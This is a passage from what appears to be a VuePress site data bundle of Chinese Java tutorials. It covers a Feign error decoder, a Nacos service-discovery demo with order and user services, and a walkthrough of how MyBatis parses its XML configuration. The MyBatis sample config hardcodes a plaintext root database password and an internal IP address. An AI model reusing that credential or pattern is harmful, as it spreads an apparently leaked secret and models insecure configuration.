{"code":200,"msg":null,"data":{"current":1,"size":20,"total":1,"records":[{"createtime":"2020-06-15t03:46:17.000+00:00","updatetime":"2020-06-15t03:46:17.000+00:00","deleteflag":false,"id":1,"menuid":25,"name":"平顶山新能源项目1期","buildingdegree":30,"cityname":"平顶山","cityid":"410400","lng":"113.308","lat":"33.7352","remarks":"测试数据"}]}}\n2020-06-18 09:54:06.484 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] <--- end http (362-byte body)\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n我就试到这里了，正常来说 full 已经足够了。\n\n\n# feign 的全局异常处理\n\n@configuration\npublic class feignclienterrordecoder implements errordecoder {\n\n    private static final log log = logfactory.getlog(feignclienterrordecoder.class);\n\n    @override\n    public exception decode(string methodkey, response response) {\n        try {\n            string body = ioutil.read(response.body().asinputstream(), "utf-8");\n            map<string,string> errmap = jsonobject.parseobject(body, hashmap.class);\n            return new internalexception(errmap.get("message"));\n        }catch(exception e){\n            return new internalexception(e.getmessage());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n',charsets:{cjk:!0}},{title:"SpringCloud alibaba - Nacos",frontmatter:{title:"SpringCloud alibaba - Nacos",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-cloud/2/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/04.spring%20cloud/2.SpringCloud%20alibaba%20-%20Nacos.html",relativePath:"01.框架/01.Spring/04.spring cloud/2.SpringCloud alibaba - Nacos.md",key:"v-63ccbaf9",path:"/spring/spring-cloud/2/",headers:[{level:2,title:"文档学习",slug:"文档学习",normalizedTitle:"文档学习",charIndex:2},{level:2,title:"discovery",slug:"discovery",normalizedTitle:"discovery",charIndex:147},{level:3,title:"下载安装Nacos我就不说了",slug:"下载安装nacos我就不说了",normalizedTitle:"下载安装 nacos 我就不说了",charIndex:281},{level:3,title:"先搭建基本的服务结构",slug:"先搭建基本的服务结构",normalizedTitle:"先搭建基本的服务结构",charIndex:313},{level:3,title:"启动",slug:"启动",normalizedTitle:"启动",charIndex:7898},{level:3,title:"访问结果:",slug:"访问结果",normalizedTitle:"访问结果:",charIndex:7907}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"文档学习 discovery 下载安装Nacos我就不说了 先搭建基本的服务结构 启动 访问结果:",content:'# 文档学习\n\nNacos 介绍\nNacos 下载及配置 下载地址\nNacos server 配置说明\nNacos spring cloud 基础入门\nNacos spring 注解说明\nNacos 对应 spring cloud 版本\nNacos config yml 配置说明\nNacos discovery yml 配置 API\nspring 官网对 cloud alibaba 的介绍及配置\n\n> Nacos config 是监听配置信息 (yml) 发生变化的\n> Nacos discovery 是注册发现服务的\n\n\n# discovery\n\n\n# 下载安装 Nacos 我就不说了\n\n安装好访问页面\n\n\n\n\n# 先搭建基本的服务结构\n\n\n\ndemo-cloud pom.xml\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.2.5.RELEASE</version>\n        <relativePath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n\n    <groupId>com.example</groupId>\n    <artifactId>demo-cloud</artifactId>\n    <version>0.0.1-SNAPSHOT</version>\n    <name>demo-cloud</name>\n    <description>Demo project for Spring Boot</description>\n\n    <properties>\n        <java.version>1.8</java.version>\n    </properties>\n\n    <dependencyManagement>\n        <dependencies>\n            <dependency>\n                <groupId>com.alibaba.cloud</groupId>\n                <artifactId>spring-cloud-alibaba-dependencies</artifactId>\n                <version>2.1.0.RELEASE</version>\n                <type>pom</type>\n                <scope>import</scope>\n            </dependency>\n        </dependencies>\n    </dependencyManagement>\n\n\n    <modules>\n        <module>demo-order-server</module>\n        <module>demo-user-server</module>\n    </modules>\n\n\n    <dependencies>\n\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter</artifactId>\n        </dependency>\n\n        \x3c!-- Nacos 注册发现 --\x3e\n        <dependency>\n            <groupId>com.alibaba.cloud</groupId>\n            <artifactId>spring-cloud-starter-alibaba-nacos-discovery</artifactId>\n        </dependency>\n        \x3c!-- Nacos 配置监听--\x3e\n\x3c!--        <dependency>--\x3e\n\x3c!--            <groupId>com.alibaba.cloud</groupId>--\x3e\n\x3c!--            <artifactId>spring-cloud-starter-alibaba-nacos-config</artifactId>--\x3e\n\x3c!--        </dependency>--\x3e\n\n    </dependencies>\n\n    <build>\n        <plugins>\n            <plugin>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-maven-plugin</artifactId>\n            </plugin>\n        </plugins>\n    </build>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n\n\ndemo-order-server.pom 和 demo-user-server.pom 一样\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    <parent>\n        <groupId>com.example</groupId>\n        <artifactId>demo-cloud</artifactId>\n        <version>0.0.1-SNAPSHOT</version>\n    </parent>\n\n    <groupId>com.example</groupId>\n    <artifactId>demo-order-server</artifactId>\n    <version>0.0.1-SNAPSHOT</version>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\ndemo-order-server.yml\n\nserver:\n  port: 8080\n\nspring:\n  application:\n    name: order-server\n  cloud:\n    nacos:\n      discovery:\n        server-addr: 127.0.0.1:8848\n        # 值范围：1到100。值越大，重量越大。\n        weight: 1\n        # 集群名称\n        cluster-name:  order\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ndemo-user-server.yml\n\nserver:\n  port: 8081\n\nspring:\n  application:\n    name: user-server\n  cloud:\n    nacos:\n      discovery:\n        server-addr: 127.0.0.1:8848\n        # 值范围：1到100。值越大，重量越大。\n        weight: 1\n        # 集群名称\n        cluster-name:  user\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ndemo-user-server Application\n\npackage com.example.userserver;\n\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.boot.web.client.RestTemplateBuilder;\nimport org.springframework.cloud.client.discovery.EnableDiscoveryClient;\nimport org.springframework.cloud.client.loadbalancer.LoadBalanced;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.web.client.RestTemplate;\n\n@SpringBootApplication\n@EnableDiscoveryClient\npublic class DemoUserServerApplication {\n\n    public static void main(String[] args) {\n        SpringApplication.run(DemoUserServerApplication.class, args);\n    }\n\n    /**\n     * 手动创建一个RestTemplate的配置：\n    **/\n    @Bean\n    @LoadBalanced\n    public RestTemplate restTemplate(RestTemplateBuilder builder){\n        return builder.build();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\ndemo-order-server Application\n\npackage com.example.orderserver;\n\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.cloud.client.discovery.EnableDiscoveryClient;\n\n@SpringBootApplication\n@EnableDiscoveryClient\npublic class DemoOrderServerApplication {\n\n    public static void main(String[] args) {\n        SpringApplication.run(DemoOrderServerApplication.class, args);\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ndemo-order-server OrderController\n\npackage com.example.orderserver.controller;\n\nimport org.springframework.web.bind.annotation.*;\n\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\n/**\n * @Author big uncle\n * @Date 2020/3/20 11:33\n * @module HYQ_APP\n **/\n@RestController\n@RequestMapping("order")\npublic class OrderController {\n\n    Map<String,List<String>> map = new HashMap<String,List<String>>(10){{\n        put("1",Arrays.asList("userId:1 orderId:1","userId:1 orderId:2","userId:1 orderId:3","userId:1 orderId:4"));\n        put("2",Arrays.asList("userId:2 orderId:10","userId:2 orderId:12","userId:2 orderId:13","userId:2 orderId:14"));\n        put("3",Arrays.asList("userId:3 orderId:20","userId:3 orderId:22","userId:3 orderId:23","userId:3 orderId:24"));\n    }};\n\n\n    @GetMapping("/getOrder/{userId}")\n    public List<String> getOrder(@PathVariable String userId){\n        return map.get(userId);\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\ndemo-user-server OrderController\n\npackage com.example.userserver.controller;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.RestController;\nimport org.springframework.web.client.RestTemplate;\n\nimport java.util.List;\n\n/**\n * 所属Y-API模块\n * 模块描述\n *\n * @Author big uncle\n * @Date 2020/3/20 11:24\n * @module HYQ_APP\n **/\n@RestController\n@RequestMapping("user")\npublic class UserController {\n\n    private RestTemplate restTemplate;\n\n    @Autowired\n    public UserController(RestTemplate restTemplate) {\n        this.restTemplate = restTemplate;\n    }\n\n\n    @GetMapping("/getMyOrder")\n    public List<String> getMyOrder(@RequestParam("userId") String userId){\n        List<String> list = restTemplate.getForObject("http://order-server/order/getOrder/" + userId, List.class);\n        return list;\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# 启动\n\n\n\n\n# 访问结果:\n\n',normalizedContent:'# 文档学习\n\nnacos 介绍\nnacos 下载及配置 下载地址\nnacos server 配置说明\nnacos spring cloud 基础入门\nnacos spring 注解说明\nnacos 对应 spring cloud 版本\nnacos config yml 配置说明\nnacos discovery yml 配置 api\nspring 官网对 cloud alibaba 的介绍及配置\n\n> nacos config 是监听配置信息 (yml) 发生变化的\n> nacos discovery 是注册发现服务的\n\n\n# discovery\n\n\n# 下载安装 nacos 我就不说了\n\n安装好访问页面\n\n\n\n\n# 先搭建基本的服务结构\n\n\n\ndemo-cloud pom.xml\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0" xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-starter-parent</artifactid>\n        <version>2.2.5.release</version>\n        <relativepath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n\n    <groupid>com.example</groupid>\n    <artifactid>demo-cloud</artifactid>\n    <version>0.0.1-snapshot</version>\n    <name>demo-cloud</name>\n    <description>demo project for spring boot</description>\n\n    <properties>\n        <java.version>1.8</java.version>\n    </properties>\n\n    <dependencymanagement>\n        <dependencies>\n            <dependency>\n                <groupid>com.alibaba.cloud</groupid>\n                <artifactid>spring-cloud-alibaba-dependencies</artifactid>\n                <version>2.1.0.release</version>\n                <type>pom</type>\n                <scope>import</scope>\n            </dependency>\n        </dependencies>\n    </dependencymanagement>\n\n\n    <modules>\n        <module>demo-order-server</module>\n        <module>demo-user-server</module>\n    </modules>\n\n\n    <dependencies>\n\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-web</artifactid>\n        </dependency>\n\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter</artifactid>\n        </dependency>\n\n        \x3c!-- nacos 注册发现 --\x3e\n        <dependency>\n            <groupid>com.alibaba.cloud</groupid>\n            <artifactid>spring-cloud-starter-alibaba-nacos-discovery</artifactid>\n        </dependency>\n        \x3c!-- nacos 配置监听--\x3e\n\x3c!--        <dependency>--\x3e\n\x3c!--            <groupid>com.alibaba.cloud</groupid>--\x3e\n\x3c!--            <artifactid>spring-cloud-starter-alibaba-nacos-config</artifactid>--\x3e\n\x3c!--        </dependency>--\x3e\n\n    </dependencies>\n\n    <build>\n        <plugins>\n            <plugin>\n                <groupid>org.springframework.boot</groupid>\n                <artifactid>spring-boot-maven-plugin</artifactid>\n            </plugin>\n        </plugins>\n    </build>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n\n\ndemo-order-server.pom 和 demo-user-server.pom 一样\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    <parent>\n        <groupid>com.example</groupid>\n        <artifactid>demo-cloud</artifactid>\n        <version>0.0.1-snapshot</version>\n    </parent>\n\n    <groupid>com.example</groupid>\n    <artifactid>demo-order-server</artifactid>\n    <version>0.0.1-snapshot</version>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\ndemo-order-server.yml\n\nserver:\n  port: 8080\n\nspring:\n  application:\n    name: order-server\n  cloud:\n    nacos:\n      discovery:\n        server-addr: 127.0.0.1:8848\n        # 值范围：1到100。值越大，重量越大。\n        weight: 1\n        # 集群名称\n        cluster-name:  order\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ndemo-user-server.yml\n\nserver:\n  port: 8081\n\nspring:\n  application:\n    name: user-server\n  cloud:\n    nacos:\n      discovery:\n        server-addr: 127.0.0.1:8848\n        # 值范围：1到100。值越大，重量越大。\n        weight: 1\n        # 集群名称\n        cluster-name:  user\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ndemo-user-server application\n\npackage com.example.userserver;\n\nimport org.springframework.boot.springapplication;\nimport org.springframework.boot.autoconfigure.springbootapplication;\nimport org.springframework.boot.web.client.resttemplatebuilder;\nimport org.springframework.cloud.client.discovery.enablediscoveryclient;\nimport org.springframework.cloud.client.loadbalancer.loadbalanced;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.web.client.resttemplate;\n\n@springbootapplication\n@enablediscoveryclient\npublic class demouserserverapplication {\n\n    public static void main(string[] args) {\n        springapplication.run(demouserserverapplication.class, args);\n    }\n\n    /**\n     * 手动创建一个resttemplate的配置：\n    **/\n    @bean\n    @loadbalanced\n    public resttemplate resttemplate(resttemplatebuilder builder){\n        return builder.build();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\ndemo-order-server application\n\npackage com.example.orderserver;\n\nimport org.springframework.boot.springapplication;\nimport org.springframework.boot.autoconfigure.springbootapplication;\nimport org.springframework.cloud.client.discovery.enablediscoveryclient;\n\n@springbootapplication\n@enablediscoveryclient\npublic class demoorderserverapplication {\n\n    public static void main(string[] args) {\n        springapplication.run(demoorderserverapplication.class, args);\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ndemo-order-server ordercontroller\n\npackage com.example.orderserver.controller;\n\nimport org.springframework.web.bind.annotation.*;\n\nimport java.util.arrays;\nimport java.util.hashmap;\nimport java.util.list;\nimport java.util.map;\n\n/**\n * @author big uncle\n * @date 2020/3/20 11:33\n * @module hyq_app\n **/\n@restcontroller\n@requestmapping("order")\npublic class ordercontroller {\n\n    map<string,list<string>> map = new hashmap<string,list<string>>(10){{\n        put("1",arrays.aslist("userid:1 orderid:1","userid:1 orderid:2","userid:1 orderid:3","userid:1 orderid:4"));\n        put("2",arrays.aslist("userid:2 orderid:10","userid:2 orderid:12","userid:2 orderid:13","userid:2 orderid:14"));\n        put("3",arrays.aslist("userid:3 orderid:20","userid:3 orderid:22","userid:3 orderid:23","userid:3 orderid:24"));\n    }};\n\n\n    @getmapping("/getorder/{userid}")\n    public list<string> getorder(@pathvariable string userid){\n        return map.get(userid);\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\ndemo-user-server ordercontroller\n\npackage com.example.userserver.controller;\n\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.web.bind.annotation.getmapping;\nimport org.springframework.web.bind.annotation.requestmapping;\nimport org.springframework.web.bind.annotation.requestparam;\nimport org.springframework.web.bind.annotation.restcontroller;\nimport org.springframework.web.client.resttemplate;\n\nimport java.util.list;\n\n/**\n * 所属y-api模块\n * 模块描述\n *\n * @author big uncle\n * @date 2020/3/20 11:24\n * @module hyq_app\n **/\n@restcontroller\n@requestmapping("user")\npublic class usercontroller {\n\n    private resttemplate resttemplate;\n\n    @autowired\n    public usercontroller(resttemplate resttemplate) {\n        this.resttemplate = resttemplate;\n    }\n\n\n    @getmapping("/getmyorder")\n    public list<string> getmyorder(@requestparam("userid") string userid){\n        list<string> list = resttemplate.getforobject("http://order-server/order/getorder/" + userid, list.class);\n        return list;\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# 启动\n\n\n\n\n# 访问结果:\n\n',charsets:{cjk:!0}},{title:"核心功能拆解 工作流程",frontmatter:{title:"核心功能拆解 工作流程",date:"2023-06-25T09:22:36.000Z",permalink:"/mybatis/mybatis/300/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/02.Mybatis/31.mybatis/300.%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E6%8B%86%E8%A7%A3%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.html",relativePath:"01.框架/02.Mybatis/31.mybatis/300.核心功能拆解 工作流程.md",key:"v-25d7f92e",path:"/mybatis/mybatis/300/",headers:[{level:2,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:296},{level:3,title:"加载&解析XML",slug:"加载-解析xml",normalizedTitle:"加载 &amp; 解析 xml",charIndex:null},{level:4,title:"Configuration 初始化配置",slug:"configuration-初始化配置",normalizedTitle:"configuration 初始化配置",charIndex:2012},{level:4,title:"environments 环境解析",slug:"environments-环境解析",normalizedTitle:"environments 环境解析",charIndex:3823},{level:4,title:"mapper 解析",slug:"mapper-解析",normalizedTitle:"mapper 解析",charIndex:4353},{level:4,title:"plugins 插件解析",slug:"plugins-插件解析",normalizedTitle:"plugins 插件解析",charIndex:6309},{level:4,title:"settings 设置解析",slug:"settings-设置解析",normalizedTitle:"settings 设置解析",charIndex:6325},{level:2,title:"准备",slug:"准备",normalizedTitle:"准备",charIndex:299},{level:2,title:"执行",slug:"执行",normalizedTitle:"执行",charIndex:302}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"解析 加载&解析XML Configuration 初始化配置 environments 环境解析 mapper 解析 plugins 插件解析 settings 设置解析 准备 执行",content:'MyBatis 是一个 Java 的 ORM 框架，它使用 XML 或注解来配置和映射 SQL 语句，同时提供了增删改查等常用操作的 API。Mybatis 还提供了许多高级映射和查询功能，例如延迟加载、缓存和批量操作，这使得开发人员可以轻松地编写出高性能、可维护的数据访问层。\n\n关于 MyBatis 我们主要要了解他的工作流程，特性，和部分重要的知识点，就像 Spring，我们主要是了解他的生命周期，可扩展项等，所谓生命周期，也是 Spring 的工作流程。\n\n以下是整个 MyBatis 的工作流程图，对应图中会讲解每个节点重要的知识点。这里要记住 MyBatis 主要的工作模式就是解析、准备和执行，所谓解析就是得到 XML 的信息，维护到一个叫 Configuration 的配置类中；准备就是 opensession 部分，他会得到 Configuration 中的信息，根据执行部分所使用的执行器，数据源，事务等进行实例化和关系映射；使用就是当我们去进行查询或新增等操作，从资源和信息中拿取已被缓存的对象或执行器等，执行对应的方法。\n\n\n\n\n# 解析\n\n解析部分对应图中 加载&解析XML 至 XMLConfigBuilder#mapperElement 这里，可以说是读取 XML 到维护各类对象关系和信息的核心。下面我们分解讲解每个步骤都做了哪些事情以及核心部分解析得到了什么。\n\n\n# 加载 & 解析 XML\n\n这部分主要是读取 mybatis-config-datasource.xml 文件，该文件主要维护了一些公共资源信息，包括环境信息（数据库连接信息），对应的 mapper 文件信息，设置信息等。\n\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n    \x3c!-- 设置信息 --\x3e\n    <settings>\n        \x3c!-- 全局缓存：true/false 管理一级缓存和二级缓存的是否使用 --\x3e\n        <setting name="cacheEnabled" value="true"/>\n        \x3c!--缓存级别：SESSION/STATEMENT--\x3e\n        <setting name="localCacheScope" value="STATEMENT"/>\n    </settings>\n    \x3c!-- 环境信息 --\x3e\n    <environments default="development">\n        <environment id="development">\n            <transactionManager type="JDBC"/>\n            <dataSource type="POOLED">\n                <property name="driver" value="com.mysql.jdbc.Driver"/>\n                <property name="url" value="jdbc:mysql://10.240.30.93:3306/test?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false"/>\n                <property name="username" value="root"/>\n                <property name="password" value="Dev@root2021"/>\n            </dataSource>\n        </environment>\n    </environments>\n    \x3c!-- 维护所有mapper --\x3e\n    <mappers>\n        \x3c!-- XML 配置 --\x3e\n        <mapper resource="mapper/Activity_Mapper.xml"/>\n    </mappers>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n读取到文件后调用 XMLConfigBuilder#parse 进行解析，解析内容如下。\n\n# Configuration 初始化配置\n\n在整个文件解析之前，MyBatis 会先把一些信息进行提前初始化，也就是上图中 new Configuration（） 阶段，该类最终会被多个 MyBatis 的类所引用并贯穿整个 MyBatis 工作流程，由于被引用的类太多，这里就不一一列举，我们只要知道他贯穿整个流程即可。\n\n\n\nConfiguration 被初始化时包含了大量的信息，这些信息就是在解析 xml 文件时维护的，逐一讲解下每个配置的具体作用：\n\n * environment：缓存了环境 ID（可设置默认环境，环境包括：开发环境、测试环境等），事务工厂，数据源（有池或无池或其他连接池）等\n * mapperRegistry：映射注册机，缓存每个接口（ 接口对象Class做为key ）所对应的 MapperProxyFactory ，提供添加映射代理类和获取代理类\n * mappedStatements：缓存 SQL 语句的拆解信息。XML 的 namespace.标签ID做为（key） ，value 为 MappedStatement，信息包括： mapper路径 ， SQL类型（SELECT|INSERT等） ， SQL语句 ， 条件 ， 该条语句的缓存信息 ， 返回结果对象 ， 是否缓存标志 等。\n * resultMaps：缓存 resultMap 标签的拆解信息。XML 的 namespace.resultMap做为（key） ，然后对应 value 存放 SQL字段，映射对象字段，字段JAVA数据类型，类型对应的执行器 等\n * interceptorChain：缓存 plugins 标签的拆解信息。会在执行 newParameterHandler，newResultSetHandler，newStatementHandler，newExecutor 进行拦截。\n * typeAliasRegistry：缓存了每个 java 基本类型的封装类，以及 JdbcTransactionFactory，DruidDataSourceFactory，UnpooledDataSourceFactory，PooledDataSourceFactory，PerpetualCache，FifoCache 等 Mybatis 提供的已知类，用于快速解析 XML 描述的值，便于快速得到 Class 信息并获取实例。\n * typeHandlerRegistry：存放对应数据类型的处理策略，比如 JAVA 类型，对应 SQL 类型的处理策略，或 JAVA 类型对应的处理策略。用于设置 SQL 语句参数和获取查询结果的数据类型转换策略。\n * objectFactory：对象工厂，用于创建对象实例，使用反射。\n * objectWrapperFactory：对象包装器，放着，被解析对象的实例，以及对应的 set，get，构造器，类型等信息。 objectFactory 与 objectWrapperFactory 是为 MetaObject 提供支持的，以解析对象信息进行，然后获取对象某个特定属性的数据，缓存是为了加快获取速度，如果属性也是一个对象则会递归缓存，获取值也会递归获取。\n * loadedResources：存放已被加载的 mapper.xml 文件，以防止重复加载\n * languageRegistry：存放默认的语言解析驱动器，比如存放了 XMLLanguageDriver ，提供快速获取这个解析器，然后提供 SQL 解析。\n * cacheEnabled：解析是否启用缓存，该配置对于二级缓存生效，一次缓存是默认缓存。\n * localCacheScope：一级缓存，缓存策略默认是永久缓存，缓存方式分为 SESSION 和 STATEMENT ， SESSION 在该会话中命中相同 sql 语句和条件，若在该 SESSION 中发生 insert/update/delete/commit/rollback/close 则会清除缓存，但是，并不会影响其它会话中的缓存； STATEMENT ，只针对当前会话执行的这一语句有效，执行完毕查询会立即清除缓存。\n * caches：二级缓存，基于 namespace 的缓存，可提供第三方其他方式实现。\n\n# environments 环境解析\n\n在环境解析过程中会得到下面几个重要的属性：\n\n * ID：表明使用哪一个环境做为主要环境配置，解析 XML 中的 <environment > 标签\n * TransactionFactory：解析 XML 中的 <transactionManager> 的 type 属性，如果是 JDBC 则就是 JdbcTransactionFactory ，也可以自行设置，需要自己注册到 typeAliasRegistry 中\n * DataSourceFactory：解析 XML 中 <dataSource> 的 type 属性，如果是 POOLED ，则对应 PooledDataSourceFactory ， UNPOOLED 对应 UnpooledDataSourceFactory ， DRUID 对应 DruidDataSourceFactory\n * DataSource：解析 XML 中 <property> 得到具体的连接信息，从 DataSourceFactory 中获取 DataSource\n\n当以上的信息组件完毕后会封装到 Environment 中，然后添加到 configuration\n\n# mapper 解析\n\n在 mapper 解析中有两种不同的解析，一个是我们常见的 XML 解析，一种是注解，如 @select，这里只讲 XML 解析，有关 @select 等注解解析，放在后续专开一章。那解析首先会读取所到所有的 mapper，在分别解析每个 mapper\n\n<mappers>\n    \x3c!-- XML 配置 --\x3e\n    <mapper resource="mapper/Activity_Mapper.xml"/>\n</mappers>\n\n\n1\n2\n3\n4\n\n\n一个完整的 Mapper 大致包含如下信息，所以内部会有多个解析分别解析，如 cache 解析，resultMap 解析，select 解析，insert 解析等，我们这里说下重要的解析对象和作用即可。\n\n<mapper namespace="cn.bugstack.mybatis.test.dao.IActivityDao">\n    <cache eviction="FIFO" flushInterval="600000" size="512" readOnly="true"/>\n    <resultMap id="activityMap" type="cn.bugstack.mybatis.test.po.Activity">\n        <id column="id" property="id"/>\n        <result column="activity_id" property="activityId"/>\n        <result column="activity_name" property="activityName"/>\n        <result column="activity_desc" property="activityDesc"/>\n        <result column="create_time" property="createTime"/>\n        <result column="update_time" property="updateTime"/>\n    </resultMap>\n    <select id="queryActivityById" parameterType="cn.bugstack.mybatis.test.po.Activity" resultMap="activityMap" flushCache="false" useCache="true">\n        SELECT activity_id, activity_name, activity_desc, create_time, update_time\n        FROM activity\n        <trim prefix="where" prefixOverrides="AND | OR" suffixOverrides="and">\n            <if test="null != activityId">\n                activity_id = #{activityId}\n            </if>\n        </trim>\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n<cache > 标签配置于二级缓存，对于缓存也会有单独的一章讲解，这里只讲解析得到的重要类及作用，通过标签会封装一个 Cache 对象，该对象以 namespace 做为 cache 的 Id ，并把 Cache 对象添加到 configuration 中\n\n<resultMap> 标签配置一个 <select > 标签的 resultMap 属性返回结果对象的关系映射，他会得到对象以及得到描述的各 java 属性类型和对应的 TypeHandler 